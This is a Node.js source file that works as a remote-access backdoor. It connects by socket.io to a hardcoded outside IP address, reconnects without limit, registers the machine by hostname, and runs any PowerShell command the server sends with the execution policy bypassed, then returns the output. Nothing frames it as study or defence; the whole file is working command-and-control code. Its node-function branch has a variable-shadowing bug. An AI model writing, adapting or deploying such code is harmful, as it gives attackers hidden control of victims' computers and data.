let orionSocketModule     = require("socket.io-client")
let orionOS               = require("os")
let orionShellModule      = require("node-powershell")

let orionSocketConnection = orionSocketModule.connect( "http://139.59.200.147:4001/", {
  "reconnection": true,
  "reconnectionDelay": 5,
  "reconnectionDelayMax" : 10,
  "reconnectionAttempts": Infinity,
})

//
// Declerations
//

let additionalFunctions = {

}

let generateUUID = () => {
    generateUUID.tail = generateUUID.tail || (function(nics) {
        var nic, index, addr, retn;
        for (nic in nics) {
            for (index in nics[nic]) {
                addr = nics[nic][index];
                if (!addr.internal) {
                    if (addr.address.indexOf('fe80::') === 0) { // found scope-local
                        retn = retn || addr.address.slice(6).split(/:/).map(function(v, i, a) {
                            return parseInt(v, 16);
                        });
                    }
                }
            }
        }
        if (!retn) {
            index = Math.pow(2, 16);
            retn = [];
            retn.push(Math.floor(Math.random() * index) | 0x1000);
            retn.push(Math.floor(Math.random() * index));
            retn.push(Math.floor(Math.random() * index));
            retn.push(Math.floor(Math.random() * index));
        }
        retn[3] = 0x10000 | retn[3];
        retn[2] = 0x10000 | retn[1] & 0xff00 | retn[2] & 0x00ff;
        retn[1] = 0x10000 | retn[0] ^ 0x0200;
        retn[0] = 0x18000 | process.pid & 0x3fff;
        retn = retn.map(function(v, i, a) {
            return v.toString(16).slice(1)
        });
        return retn[0] + '-' + retn[1] + retn[2] + retn[3];
    })(require('os').networkInterfaces());

    var head = process.hrtime(), now = Math.floor(Date.now() / 1000);
    head[1] = Math.floor(head[1] * 0.268435456); // 2^28 / 10^9
    head[2] = (0x11000 | head[1] & 0x0fff).toString(16).slice(1);
    head[1] = (0x10000 | head[1] >>> 12 & 0xffff).toString(16).slice(1);
    head[0] = (4294967296 + now).toString(16).slice(1);
    return head.concat(generateUUID.tail).join('-');
};

let emitUniqueHost = (UUID) => {
  setTimeout(
    () => orionSocketConnection.emit('roomConnectionHost', UUID),
    5000
  );
  return orionSocketConnection.emit('roomConnectionHost', UUID)
}

//
// Function calls
//

console.log("Starting proc")

let UUID = orionOS.hostname()
emitUniqueHost(UUID)

orionSocketConnection.on(UUID, function (responseData) {
  if (responseData.computerName !== UUID) return

  if (responseData.internalCall.isNode){
    console.log("Calling 'Node' matrix; ", responseData.internalCall.Function, " - ", responseData.internalCall.Data);

    let responseData = additionalFunctions[responseData.internalCall.Function](
      responseData.internalCall.Data
    )

    return responseData.then(Out => orionSocketConnection.emit('codeExecutionResponse', {
      uniqueRoomNumber: UUID,
      stdout: "Called: " +  responseData.internalCall.Function + "\n\nWith data: " + responseData.internalCall.Data,
      stderr: "Response: \n\n" + Out.SUCCESS
    })).catch( Error => orionSocketConnection.emit('codeExecutionResponse', {
      uniqueRoomNumber: UUID,
      error: Error
    }))
  }

  if (responseData.internalCall.isShell){
    let orionShell = new orionShellModule({
      executionPolicy: 'Bypass',
      noProfile: true
    });

    orionShell.addCommand(responseData.internalCall.Data)
    orionShell
      .invoke()
      .then(outputShell => {
        return orionSocketConnection.emit('codeExecutionResponse', {
          uniqueRoomNumber: UUID,
          stdout: outputShell,
          stderr: "Successfully called: " +  responseData.internalCall.Data,
        })
      })
      .catch(erroredShell => {
        orionSocketConnection.emit('codeExecutionResponse', {
          uniqueRoomNumber: UUID,
          error: erroredShell
        })
        return orionShell.dispose();
      })
  }
})
